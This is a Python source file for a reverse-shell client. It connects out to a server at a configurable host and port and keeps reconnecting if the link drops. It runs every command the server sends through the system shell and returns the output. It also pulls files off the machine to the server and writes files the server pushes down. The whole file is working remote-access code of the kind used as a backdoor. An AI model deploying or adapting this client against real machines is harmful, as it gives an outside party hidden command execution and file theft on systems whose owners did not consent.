import socket
import time
import subprocess
import os
import struct, base64
import sys
from getopt import *

# Function for colored output
def color(r=None, g=None, b=None, text=None, col=None):
    colors = {
        "red": (255, 0, 0),
        "green": (0, 255, 0),
        "blue": (0, 0, 255),
        "yellow": (255, 255, 0),
        "cyan": (0, 255, 255),
        "magenta": (255, 0, 255),
        "white": (255, 255, 255),
        "black": (0, 0, 0)
    }

    if col and col in colors:
        r, g, b = colors[col]

    if r is not None and g is not None and b is not None and text is not None:
        return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)
    return text  # Default return of plain text if inputs are missing

# Create and return a socket.
def createSocket():
    #Create and return a socket.
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the server, retrying if it fails.
def connectToServer(clientSocket, host='127.0.0.1', port=12345):
    #Attempt to connect to the server, retrying if it fails.
    connected = False
    while not connected:
        try:
            clientSocket.connect((host, port))
            connected = True
            print(color(col='green', text=f'Trying to connect to server at:') + color(col='cyan', text=f'<{host} : {port}>'))
        except ConnectionRefusedError as e:
            conRefErrorStr = "\n-- Could NOT find server, trying again. Ctrl+C to terminate program fully"
            print(f"{color(col='red', text=str(e))} {conRefErrorStr}")
            for waiting in range(5): time.sleep(1)
        except KeyboardInterrupt: return 
        
# Get the server's IP and port.
def getServerInfo(clientSocket):
    #Return the server's IP and port.
    serverIP, serverPort = clientSocket.getpeername()
    return serverIP, serverPort

# Handle 'cd' command
def handleCDCommand(data, clientSocket):
    try:
        # Change the directory
        path = data[3:].strip()  # Extract the path after 'cd '
        os.chdir(path)  # Change the current working directory
        current_dir = os.getcwd()  # Get the current working directory
        clientSocket.send(f"Changed directory to: {current_dir}".encode('utf-8'))
    except Exception as e:
        error_message = f"Error: {str(e)}"
        clientSocket.send(error_message.encode('utf-8'))

# Handle file upload from server to client
def handleUpload(clientSocket):
    try:
        # Receive the file size
        raw_size = clientSocket.recv(8)
        if not raw_size:
            print("Error: Did not receive file size.")
            return
        file_size = struct.unpack(">Q", raw_size)[0]

        # Receive the file name length and name
        file_name_length = struct.unpack(">I", clientSocket.recv(4))[0]
        file_name = clientSocket.recv(file_name_length).decode('utf-8')

        # Receive the file data
        with open(file_name, 'wb') as f:
            print(f"Receiving file from server: {file_name} ({file_size} bytes)")
            bytes_received = 0
            while bytes_received < file_size:
                data = clientSocket.recv(1024)
                if not data:
                    break
                f.write(data)
                bytes_received += len(data)
        print(f"File uploaded successfully: {file_name}")
    except Exception as e:
        print(f"Error during upload: {str(e)}")

# Handle file download from client to server
def handleDownload(clientSocket, path):
    try:
        # Check if the file exists
        if not os.path.exists(path):
            clientSocket.send(b"ERROR: File not found.")
            return

        # Step 1: Send the file size
        file_size = os.path.getsize(path)
        clientSocket.send(struct.pack(">Q", file_size))

        # Step 2: Send the file name length and file name
        file_name = os.path.basename(path).encode('utf-8')
        clientSocket.send(struct.pack(">I", len(file_name)) + file_name)

        # Step 3: Send the file content in chunks
        with open(path, 'rb') as f:
            # print(f"Sending {file_name.decode('utf-8')} to server...")
            while True:
                data = f.read(1024)
                if not data:
                    break
                clientSocket.sendall(data)
            # print(f"File sent successfully: {file_name.decode('utf-8')}")
    except Exception as e:
        error_message = f"Error during file transfer: {str(e)}"
        clientSocket.send(error_message.encode('utf-8'))

# Process received data/commands
def processData(data, clientSocket):
    if data.lower().startswith("upload "):
        handleUpload(clientSocket)
        return False

    if data.lower().startswith("download "):
        path = data[9:].strip()
        handleDownload(clientSocket, path)
        return False

    if data.lower().startswith("cd "):
        handleCDCommand(data, clientSocket)
        return False

    try:
        # Use shell=True to handle quotes, spaces, and redirections
        result = subprocess.run(data, capture_output=True, text=True, timeout=30, shell=True)

        output = result.stdout if result.returncode == 0 else f"Error executing command: {result.stderr}"
        clientSocket.send(output.encode('utf-8'))
    except subprocess.TimeoutExpired:
        clientSocket.send(b"Error: Command timed out.")
    except Exception as e:
        clientSocket.send(f"Error executing command: {e}".encode('utf-8'))

    return False

# Default host and port
DEFAULT_HOST = '127.0.0.1'
DEFAULT_PORT = 12345

#Gets arguments
def get_arguments():

    try:
        #option map
        options = getopt(sys.argv[1:],
                         shortopts="t:p:h",
                         longopts=["text=", "prints=", "help"])
    except GetoptError as e:
        print ("ERROR: Wrong option used --> ", e)

    host = DEFAULT_HOST
    port = DEFAULT_PORT
    if options:
        for (opt, args) in options[0]:

            #Help options
            if opt in ("-h", "--help"):
                sys.exit(print("You can use -t or --target to set the server IP/host and -p or --port to set the server port, otherwise defaults will be used."))
            #IP/Host option
            if opt in ("-t", "--target"):
                host = args
            #Port option
            try:
                if opt in ("-p", "--port"):
                    port = int(args)
            except ValueError as e:
                print("ERROR: Port must be an int value --> ", e)
                sys.exit(print("You can use -t or --target to set the server IP/host and -p or --port to set the server port, otherwise defaults will be used."))
    
    return host, port

# Main function/connection loop
def main():
    keepRunning = True
    host, port = get_arguments()
    while keepRunning:  # Outer loop for automatic reconnection
        clientSocket = createSocket()
        try:
            connectToServer(clientSocket, host, port)
        except KeyboardInterrupt:
            print(color(col='yellow', text='Terminating process.'))
            break

        serverIP, serverPort = getServerInfo(clientSocket)
        print(color(col='green', text=f'Connection established to:') + color(col='cyan', text=f'<{serverIP} : {serverPort}>'))

        try:
            while True:
                try:
                    data = clientSocket.recv(4096).decode('utf-8')
                    if not data:
                        # Server closed connection
                        raise ConnectionResetError
                    
                    if data in ["TERMINATE"]:
                        keepRunning = False
                        print(color(col='red', text="Server has remotely terminated the connection. Exiting client..."))
                        break

                    if processData(data, clientSocket):
                        break  # If disconnected by server command
                except (ConnectionResetError, ConnectionAbortedError, OSError):
                    print(color(col='red', text="Connection lost. Searching for server..."))
                    break

        except KeyboardInterrupt:
            print(color(col='yellow', text='Terminating Connection.'))
            break

        finally:
            try:
                clientSocket.close()
            except:
                pass
            # Small delay before reconnecting
            time.sleep(3)
            if keepRunning: print(color(col='yellow', text='Reattempting connection...'))

if __name__ == "__main__":
    main()
